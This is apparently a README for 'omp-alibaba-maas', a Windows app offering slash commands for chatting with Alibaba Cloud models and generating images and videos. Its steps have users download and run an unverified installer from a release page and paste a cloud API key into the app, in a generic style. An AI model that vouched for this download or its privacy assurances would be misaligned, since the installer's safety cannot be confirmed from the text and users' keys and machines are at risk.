# 🛠️ omp-alibaba-maas - Enhance your chat experience with AI

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Gunjan04-eng/omp-alibaba-maas)

This application connects your computer to the Alibaba Cloud Model Studio. You get direct access to advanced AI models like Qwen3, GLM-5.2, and DeepSeek. You also gain tools to generate images and videos using the wan2.7-image model and HappyHorse 1.1. You use these functions through simple text commands inside your chat interface.

## 📋 System Requirements

Your computer needs to meet these basic standards to run the application smoothly:

- Operating System: Windows 10 or Windows 11 (64-bit).
- Processor: Intel Core i5 or AMD equivalent.
- Memory: 8 GB of RAM or more.
- Storage: 500 MB of free disk space.
- Internet: A stable connection for API communication.

## 📥 How to Install and Start

Follow these steps to set up the software on your Windows machine.

1. Go to the [official download page](https://github.com/Gunjan04-eng/omp-alibaba-maas).
2. Look for the latest release section on the right side of the page.
3. Click the link to download the installer file.
4. Open the folder where you saved the file.
5. Double-click the file to start the installation.
6. Follow the on-screen instructions to finish the setup process.
7. Launch the application from your desktop icon once the process finishes.

## ⚙️ Initial Configuration

The application requires an API key from Alibaba Cloud to function. You provide this key during the first launch.

1. Sign in to your Alibaba Cloud Bailian account.
2. Find the API key section in your account dashboard.
3. Generate a new key and copy the text.
4. Open the omp-alibaba-maas settings window.
5. Paste your key into the text box.
6. Press the save button to lock in your settings.

## 💬 Using Slash Commands

This tool makes complex tasks easy through simple commands. You type these commands directly into your chat box.

### Chat with Models
To start a conversation with a specific AI model, use these commands:
- `/qwen3`: Starts a chat session with the Qwen3 model.
- `/glm`: Connects you to the GLM-5.2 assistant.
- `/deepseek`: Activates the DeepSeek model for your queries.

### Generating Visual Content
You can create images and videos without leaving the chat window:
- `/img [description]`: The software creates a new image based on your text description.
- `/video [description]`: The application generates a short video clip from your prompt.
- `/video-i2v [file path]`: Converts an existing image into a video file.

## 🔧 Managing Your Workflow

The HappyHorse 1.1 CLI runs in the background. It manages your requests to ensure the AI responds quickly and keeps your history organized. You can check the status of any generation task by opening the task manager window inside the app.

## 🛡️ Troubleshooting Common Issues

If you experience problems, check these items first:

- Application not loading: Restart your computer and ensure no other software blocks the program.
- API errors: Check your internet connection. Verify that your API key is still valid on the Alibaba Cloud website.
- Slow image generation: Close unused programs to free up your computer memory.
- Commands not working: Ensure you type the slash character (/) before the command name.

## 🔒 Privacy and Safety

The software stores your settings and preferences locally on your hard drive. Only your chat prompts and the resulting responses go to the Alibaba Cloud servers to process the request. No personal files are ever uploaded or shared unless you specifically select them for the image-to-video function.
